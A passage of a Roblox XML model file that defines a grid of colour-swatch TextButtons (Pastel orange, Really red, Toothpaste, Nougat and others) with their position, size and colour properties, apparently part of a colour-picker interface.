											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX98D7B7FC878345E08C2473E845DEDDC6">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294953417</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXC8F52CBBEDA1429CA2DAA5590E7629AC">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294928076</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pink</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXA5ABCAF4F182427E96434549324CCE5C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4289832959</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel violet</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX25193E81FC284E1191E62987B61D712B">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4289715711</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel light blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX0DCE8AD3747140F9B805485F342A1511">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288672745</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel blue-green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX40FD4EB77F5E4FED889F8AAD24115A67">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4291624908</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Pastel green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXC200CEDF861940BAAD2F6B99F85E6F52">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4290887234</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Olive</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX071FFD7A0ECF4510A05A961E1DEF2951">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967040</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">New Yeller</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX42837F85FCDE417C907E88D15DDFF53A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294946560</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Deep orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX2EB4D5FBC85D4A178DFBB0F9C2CD1804">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294901760</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Really red</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX73ABFC1312F040FCA0096F4A2FBCE9BE">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294901951</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Hot pink</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX663B37C3F6514E26903BCF557F2E5185">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190335</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Really blue</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>130</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXA22F85DBCC8042C79C76CB9E26DD3686">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278255615</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Toothpaste</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>155</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX26860328AF024E95B2C76BBCEBC3ECE0">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278255360</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Lime green</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>130</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXF0707D71458C49BA881DDBAE6A9CB896">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4286340166</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Brown</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX58F6B2E05E994611947818D94BD2B7A9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4291595881</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Nougat</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.75</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX8502EDADD39E456E981111B77D8FF95D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4288700213</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Dark orange</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>55</XO>
											<YS>0</YS>
											<YO>155</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
